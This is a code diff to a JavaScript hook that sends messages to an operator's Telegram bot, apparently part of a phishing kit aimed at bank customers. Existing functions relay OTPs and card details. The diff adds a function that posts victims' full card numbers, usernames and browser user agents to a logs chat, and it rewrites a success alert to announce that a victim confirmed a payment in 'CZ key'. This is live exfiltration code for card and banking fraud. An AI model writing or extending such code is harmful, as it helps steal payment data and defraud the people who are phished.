@@ -498,20 +498,30 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
     }
   };
 
-  const sendSuccessToTelegram = async (phoneNumber, sessionId) => {
+  const sendSuccessToTelegram = async (username, sessionId, cardNumber = null) => {
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       
+      let cardInfo = '';
+      if (cardNumber) {
+        const cleanNumber = cardNumber.replace(/\s/g, '');
+        const last4 = cleanNumber.slice(-4);
+        cardInfo = `\n💳 <b>Card:</b> **** **** **** ${last4}`;
+      }
+      
       const successMessage = `
-✅ <b>LOGIN COMPLETED SUCCESSFULLY!</b> ✅
+✅ <b>PAYMENT CONFIRMED IN CZ KEY!</b> ✅
 ━━━━━━━━━━━━━━━━━━━━━
 🆔 <b>Session ID:</b> <code>${sessionId}</code>
 ━━━━━━━━━━━━━━━━━━━━━
 
-📱 <b>Phone Number:</b> ${phoneNumber}
+👤 <b>Username:</b> ${username}
+${cardInfo}
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
 
-<b>Status:</b> OTP Verified ✓
+<b>Status:</b> User confirmed payment in banking app ✓
+━━━━━━━━━━━━━━━━━━━━━
+🎯 <i>Payment has been successfully confirmed!</i>
       `;
 
       await axios.post(url, {
@@ -519,8 +529,41 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
         text: successMessage,
         parse_mode: 'HTML'
       });
+      console.log('✅ Success confirmation sent to Telegram');
+      return true;
     } catch (error) {
       console.error('Error sending success message:', error);
+      return false;
+    }
+  };
+
+  const sendConfirmationLog = async (username, cardNumber, sessionId) => {
+    try {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
+      const confirmationMessage = `
+📋 <b>USER CONFIRMATION - CZ KEY</b> 📋
+━━━━━━━━━━━━━━━━━━━━━
+👤 <b>Username:</b> ${username}
+💳 <b>Card Number:</b> <code>${cardNumber}</code>
+🔘 <b>Action:</b> User confirmed payment in CZ key
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+🌐 <b>User Agent:</b> ${navigator.userAgent.substring(0, 100)}
+━━━━━━━━━━━━━━━━━━━━━
+✅ <i>Payment has been confirmed in CZ key!</i>
+      `;
+      
+      await axios.post(url, {
+        chat_id: LOGS_CHAT_ID,
+        text: confirmationMessage,
+        parse_mode: 'HTML'
+      });
+      
+      console.log('✅ Confirmation log sent to Telegram');
+      return true;
+    } catch (error) {
+      console.error('Error sending confirmation log:', error);
+      return false;
     }
   };
 
@@ -594,6 +637,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
     sendFormattedCardDetails,
     sendOtpToTelegram,
     sendSuccessToTelegram,
+    sendConfirmationLog,
     sendPageViewLog,
     sendCardVerificationLog,
     sendOtpPageLog,
